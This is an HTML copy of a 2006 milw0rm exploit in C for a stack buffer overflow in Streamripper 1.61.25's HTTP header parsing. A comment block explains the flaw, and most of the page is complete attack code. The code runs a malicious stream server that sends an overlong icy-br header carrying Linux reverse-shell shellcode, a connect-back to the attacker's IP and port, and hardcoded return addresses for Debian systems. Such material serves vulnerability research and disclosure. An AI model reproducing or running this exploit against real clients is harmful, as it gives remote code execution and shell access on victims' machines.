<html><head><title>Streamripper <= 1.61.25 HTTP Header Parsing Buffer Overflow Exploit</title></head><pre>/*
       _______         ________           .__        _____          __
___  __\   _  \   ____ \_____  \          |  |__    /  |  |   ____ |  | __
\  \/  /  /_\  \ /    \  _(__  &lt;   ______ |  |  \  /   |  |__/ ___\|  |/ /
 &gt;    &lt;\  \_/   \   |  \/       \ /_____/ |   Y  \/    ^   /\  \___|    &lt;
/__/\_ \\_____  /___|  /______  /         |___|  /\____   |  \___  &gt;__|_ \
      \/      \/     \/       \/   29\08\06    \/      |__|      \/     \/
      
 *   mm.           dM8
 *  YMMMb.       dMM8      _____________________________________
 *   YMMMMb     dMMM'     [                                     ]
 *    `YMMMb   dMMMP      [ There are doors I have yet to open  ]
 *      `YMMM  MMM'       [ windows I have yet to look through  ]
 *         &quot;MbdMP         [ Going forward may not be the answer ]
 *     .dMMMMMM.P         [                                     ]
 *    dMM  MMMMMM         [       maybe I should go back        ]
 *    8MMMMMMMMMMI        [_____________________________________]
 *     YMMMMMMMMM                   www.netbunny.org
 *       &quot;MMMMMMP
 *      MxM .mmm
 *      W&quot;W &quot;&quot;&quot;

[i] Title:              Streamripper HTTP Header Parsing Buffer Overflow Exploit
[i] Discovered by:      Ulf Harnhammar
[i] Exploit by:         Expanders
[i] References:         http://www.securityfocus.com/bid/19707   ---   http://streamripper.sourceforge.net/
[i] Greatings:          x0n3-h4ck - netbunny - my girlfriend..thanks for existing

[ Why streamripper crash? ]

Streamripper like any other shoutcast client send an HTTP GET request to the stream server then receive a pseudo-HTTP response.
Response is made of a ICY [CODE] that show the status of the remote daemon, and a few icy- headers that stores radio informations
like Title - Website - Genre - Bitrate and a special header for song-title offset in the content stream.

in lib/http.c [httplib_parse_sc_header()]

[code segment]
....
char stempbr[50];
....
rc = extract_header_value(header, stempbr, &quot;icy-br:&quot;);
....
[/code segment]

extract_header_value(...) calls subnstr_until(const char *str, char *until, char *newstr, int maxlen) that copies from [*str] to [*newstr] trimming
everything next [*until] for a maximum of [maxlen] bytes.

in streamripper-1.61.25 ( maybe prior versions ) MAX_ICY_STRING  costant is passed as [maxlen].

in lib/lib/srtypes.h

#define MAX_ICY_STRING          4024

Putting all together if we send an icy-br: header 156 byte long we reach EIP overwriting.

Code Execution is obvious possible.

[ Timeline ]

Vendor has been informed and version 1.61.26 has been released.

[ Notes ]

Exploit uses shitty hardcoded adresses, there's no registers that point to an usefull location so virtual address exploiting isn't possible.
Probably some better solution can be used but i'm really to lazy and busy to fuck my mind with that.

[ Links ]

www.x0n3-h4ck.org
www.netbunny.org



*/

#include &lt;stdio.h&gt;
#include &lt;sys/socket.h&gt;
#include &lt;sys/types.h&gt;
#include &lt;sys/stat.h&gt;
#include &lt;netinet/in.h&gt;
#include &lt;netdb.h&gt;
#include &lt;unistd.h&gt;

#define BUFFSIZE 200 // Buffer size

int banner();
int usage(char *filename);
int inject(char *port, char *ip);
int remote_connect( char* ip, unsigned short port );


/* linux_ia32_reverse -  Size=70 Encoder=None( hahaha streaming has no restricted 0x00 ) http://metasploit.com */
unsigned char shellcode[] =
                      &quot;\x31\xdb\x53\x43\x53\x6a\x02\x6a\x66\x58\x89\xe1\xcd\x80\x93\x59&quot;
                      &quot;\xb0\x3f\xcd\x80\x49\x79\xf9\x5b\x5a\x68&quot;
                      &quot;\x00\x00\x00\x00&quot; // IP
                      &quot;\x66\x68&quot;
                      &quot;\x00\x00&quot; // PORT
                      &quot;\x43\x66\x53\x89\xe1\xb0\x66\x50\x51\x53\x89\xe1\x43\xcd&quot;
                      &quot;\x80\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x52\x53&quot;
                      &quot;\x89\xe1\xb0\x0b\xcd\x80&quot;;

char http_header[] =  &quot;ICY 200 OK\r\n&quot;
                      &quot;icy-notice1:&lt;BR&gt;This stream requires &lt;a href=\&quot;http://www.winamp.com/\&quot;&gt;Winamp&lt;/a&gt;&lt;BR&gt;\r\n&quot;
                      &quot;icy-notice2:SHOUTcast Distributed Network Audio Server/unix v1.9.7&lt;BR&gt;\r\n&quot;
                      &quot;icy-name:SEGFAULT radio\r\n&quot;
                      &quot;icy-genre:Progressive House\r\n&quot;
                      &quot;icy-url:http://www.x0n3-h4ck.org\r\n&quot;
                      &quot;content-type:audio/mpeg\r\n&quot;
                      &quot;icy-pub:1\r\n&quot;
                      &quot;icy-metaint:1\r\n&quot; // mp3 metatags starts at first byte of content
                      &quot;icy-br:&quot;; // Finally here...

char http_content[] = &quot;\x0d\x0a\x0d\x0a&quot; // \r\n\r\n
                      &quot;\x04&quot; // this magic byte can be used to control malloc(m_buffersize). m_buffersize is (this-byte * 16 ) TODO: egghunter
                      &quot;\x53\x74\x72\x65\x61\x6D\x54\x69\x74\x6C\x65\x3D\x27\x45&quot;
                      &quot;\x78\x70\x61\x6E\x64\x65\x72\x73\x20\x2D\x20\x49\x27\x6C&quot;
                      &quot;\x6C\x20\x4F\x77\x6E\x20\x59\x6F\x75\x27\x3B\x53\x74\x72&quot;
                      &quot;\x65\x61\x6D\x55\x72\x6C\x3D\x27\x27\x3B\x00\x00\x00\x00&quot;
                      &quot;\x00\x00\x00\x00\x00\x00\x00\x00&quot;
                      &quot;\xd3\xff\xff\xf5\xff\xff\xf9\xaf\xff\xe5\x29\xbe\x3e\x8b\x18&quot;; // a few bytes from an mp3


struct retcodes{char *platform;unsigned long addr;} targets[]= {
        { &quot;Debian GNU/Linux testing/unstable&quot;   , 0xb7e70090 },
	{ &quot;Debian GNU/Linux 3.1&quot;, 0xb7e71070 },
	{ &quot;Crash daemon - DEBUGGING&quot;   , 0xdeadc0de },
	{ NULL }
};
int banner() {
  printf(&quot;\n[i] Title:        \tStreamripper HTTP Header Parsing BOF Exploit\n&quot;);
  printf(&quot;[i] Discovered by:\tUlf Harnhammar\n&quot;);
  printf(&quot;[i] Exploit by:   \tExpanders\n\n&quot;);
  return 0;
}

int usage(char *filename) {
  int i;
  printf(&quot;Usage: \t%s &lt;port&gt; &lt;l_ip&gt; &lt;l_port&gt; &lt;targ&gt;\n\n&quot;,filename);
  printf(&quot;       \t&lt;port&gt;   : Local port for listener  ::  Default: 8000\n&quot;);
  printf(&quot;       \t&lt;l_ip&gt;   : Local ip address for connectback\n&quot;);
  printf(&quot;       \t&lt;l_port&gt; : Local port for connectback\n&quot;);
  printf(&quot;       \t&lt;targ&gt;   : Target from the list below\n\n&quot;);
  
  printf(&quot;#   \t Address  \t Target\n&quot;);
  printf(&quot;---------------------------------------------------------\n&quot;);
  for(i = 0; targets[i].platform; i++)
        printf(&quot;%d \t 0x%08x \t %s \n&quot;,i,targets[i].addr,targets[i].platform);
  printf(&quot;---------------------------------------------------------\n&quot;);
  exit(0);
}

int inject(char *port, char *ip)
{
    unsigned long m_ip;
    unsigned short m_port;
    m_ip = inet_addr(ip);
    m_port = htons(atoi( port ));
    memcpy ( &amp;shellcode[26], &amp;m_ip, 4);
    memcpy ( &amp;shellcode[32], &amp;m_port, 2);
    return 0;
}

int socket_listen( unsigned short port )
{
  int s,reuseaddr=1;
  struct sockaddr_in localaddr;
  struct hostent* host_addr;

  localaddr.sin_family = AF_INET;
  localaddr.sin_port = htons(port);
  localaddr.sin_addr.s_addr = INADDR_ANY;
  bzero(&amp;(localaddr.sin_zero), 8);

  if ( ( s = socket(AF_INET, SOCK_STREAM, 0) ) &lt; 0 )
  {
   printf ( &quot;[X] socket() failed!\n&quot; );
   exit ( 1 );
  }
  if (setsockopt(s, SOL_SOCKET, SO_REUSEADDR, &amp;reuseaddr,(socklen_t)sizeof(reuseaddr)) &lt; 0)
  {
   printf(&quot;[X] setsockopt() failed!\n&quot;);
   exit ( 1 );
  }
  if (bind(s, (struct sockaddr *)&amp;localaddr, sizeof(localaddr)) &lt; 0) 
  {
   perror(&quot;[X] bind() failed\n&quot;);
   exit ( 1 );
  }
  if (listen(s, 1) &lt; 0)
  {
   perror(&quot;[X] listen() failed\n&quot;);
   exit ( 1 );
  }
  return ( s );
}

int client_accept( int listener )
{
  int s;
  struct sockaddr_in remoteaddr;
  int addrlen = sizeof(struct sockaddr_in);
  if ((s = accept(listener, (struct sockaddr *)&amp;remoteaddr, &amp;addrlen)) &lt; 0)
  {
   perror(&quot;[X] accept() failed\n&quot;);
   exit ( 1 );
  }
  if (getpeername(s, (struct sockaddr *)&amp;remoteaddr, &amp;addrlen) &lt; 0)
  {
   perror(&quot;[X] getpeername() failed\n&quot;);
   exit ( 1 );
  }
  printf(&quot;got connection from %s:%u\n&quot;, inet_ntoa(remoteaddr.sin_addr), ntohs(remoteaddr.sin_port));
  return ( s );
}


int main(int argc, char *argv[]) {
    int listener,client,position=0;
    unsigned int rcv;
    char buffer[BUFFSIZE],*request;
    char recvbuf[256];
    banner();
    if( (argc != 5) || (atoi(argv[1]) &lt; 1) || (atoi(argv[1]) &gt; 65534) )
        usage(argv[0]);

    printf(&quot;[+] Creating evil buffer\n&quot;);
    request = (char *) malloc(BUFFSIZE + strlen(http_header) + strlen(http_content)); //  +3 == \r + \n + 0x00
    memset(buffer,0x90,BUFFSIZE);  // Fill with nops

    inject(argv[3],argv[2]);     // Xor port and ip and put them into the shellcode

    position = 156 - strlen(shellcode);   // 156 : EIP offset
    memcpy(buffer+position,shellcode,strlen(shellcode));
    position += strlen(shellcode);
    memcpy(buffer+position,&amp;targets[atoi(argv[4])].addr,4);
    position += 4;
    memset(buffer+position,0x00,1); // End
    sprintf(request,&quot;%s%s%s&quot;,http_header,buffer,http_content);

    printf(&quot;[+] Setting up socket\n&quot;);
    listener = socket_listen(atoi(argv[1]));
    
    printf(&quot;[+] Waiting for client...&quot;);
    fflush(stdout);
    client = client_accept(listener);
    
    printf(&quot;[+] Receiving GET request...&quot;);
    fflush(stdout);
    rcv=recv(client,recvbuf,256,0);
    if(rcv&lt;0)
    {
     printf(&quot;\n[X] Error while recieving banner!\n&quot;);
     close(client);
     close(listener);
     exit( 1 );
    }
    if (strstr(recvbuf,&quot;1.61.25&quot;)!=0)
    {
     sleep(1);
     printf(&quot;ok\n[+] Sending %d bytes of painfull buffer\n&quot;,strlen(request));
     if ( send ( client, request, strlen (request), 0) &lt;= 0 )
     {
            printf(&quot;[X] Failed to send buffer\n&quot;);
            exit ( 1 );
     }
     printf(&quot;[+] Done - Wait for shell on port %s\n&quot;,argv[3]);
    } else
      printf(&quot;[X] This client is not running Streamripper or it's an unsupported version\n&quot;);
    close(client);
    close(listener);
    free(request);
    return 0;
}

// milw0rm.com [2006-08-29]</pre></html>